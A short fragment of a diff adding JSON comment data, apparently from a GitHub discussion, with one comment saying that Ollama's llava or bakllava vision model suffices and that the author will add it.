+          "body": "Actualy the ollama llava or bakllava is enough. Okey i will add.",
+          "created_at": "2024-06-05T05:59:40Z"
+        }
+      ]
+    }
+  ]
+}
